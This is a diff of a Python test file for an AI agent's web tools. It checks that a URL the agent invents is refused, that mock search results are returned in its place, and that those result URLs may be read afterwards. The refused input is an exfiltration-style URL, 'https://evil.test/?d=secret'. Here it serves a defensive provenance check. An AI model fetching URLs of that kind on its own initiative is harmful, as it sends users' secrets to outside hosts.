@@ -253,16 +253,30 @@ def test_only_urls_from_the_user_or_web_results_can_be_fetched() -> None:
             net_tools.check_source(refused, sources)
 
 
-def test_read_url_refuses_an_invented_url_without_any_request(monkeypatch) -> None:
+def test_read_url_with_an_invented_url_returns_the_search_results_instead(monkeypatch) -> None:
+    """One search replaces the extra model round trip, and the model still chooses the final URL."""
     monkeypatch.setattr(web.settings, "web_search_provider", "mock")
 
     async def never(*args, **kwargs):
-        raise AssertionError("no request may be made")
+        raise AssertionError("no page may be read")
 
     monkeypatch.setattr(web, "read_url", never)
     ctx = tools.ToolContext(messages=[{"role": "user", "content": "帮我查资料"}])
-    with pytest.raises(tools.ToolError, match="did not come from"):
-        asyncio.run(tools.execute_tool("read_url", {"url": "https://evil.test/?d=secret"}, "", None, ctx))
+    result = asyncio.run(tools.execute_tool("read_url", {"url": "https://evil.test/?d=secret"}, "", None, ctx))
+    assert result["ok"] is False and "did not come from" in result["error"]
+    assert [hit["url"] for hit in result["results"]] == [f"https://example.com/{i}" for i in range(1, 6)]
+    assert ctx.budget.requests == 1
+
+    # The URLs in that error result are now provenance for the rest of the run.
+    ctx.messages.append(tools.tool_result_message("c1", "read_url", result))
+
+    async def page(url, max_chars=None):
+        return {"url": url, "title": "Example", "text": "正文", "links": [], "truncated": False}
+
+    monkeypatch.setattr(web, "read_url", page)
+    read = asyncio.run(tools.execute_tool("read_url", {"url": "https://example.com/2"}, "", None, ctx))
+    assert read["ok"] is True and read["url"] == "https://example.com/2"
+    assert ctx.budget.requests == 2  # the supplemental search, then the read
 
 
 def test_the_run_budget_caps_requests_and_bytes(monkeypatch) -> None:
